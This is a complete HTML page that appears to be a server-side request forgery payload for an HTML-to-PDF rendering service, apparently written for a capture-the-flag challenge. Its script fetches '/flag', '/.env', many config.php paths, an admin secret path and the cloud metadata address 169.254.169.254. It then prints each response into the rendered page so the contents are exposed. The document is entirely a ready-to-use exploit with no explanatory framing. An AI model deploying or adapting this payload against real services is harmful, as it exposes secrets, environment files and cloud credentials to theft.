<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Server-Side JS Info Extractor</title>
  <style>
    body { font-family: monospace; white-space: pre-wrap; }
  </style>
</head>
<body>
  <h1>PDF JS Info Extractor</h1>
  <div id="output">Loading...</div>
  <script>
    const output = document.getElementById('output');
    const paths = [
      '/flag',
      '/admin/secret',
      '/.env',
      '/config',
      '/config.php',
      '/config/config.php',
      '/settings.php',
      '/includes/config.php',
      '/config/.env',
      '/env',
      '/app/config.php',
      '/admin/config.php',
      'http://169.254.169.254/latest/meta-data/'
    ];

    (async () => {
      let results = `URL: ${window.location.href}\n`;
      results += `User Agent: ${navigator.userAgent}\n\n`;

      for (const path of paths) {
        results += `==== Trying: ${path} ====\n`;
        try {
          const res = await fetch(path);
          if (res.ok) {
            const text = await res.text();
            results += text.slice(0, 1000) + '\n\n';
          } else {
            results += `Status: ${res.status}\n\n`;
          }
        } catch (e) {
          results += `Error: ${e.message}\n\n`;
        }
      }

      output.textContent = results;
    })();
  </script>
</body>
</html>
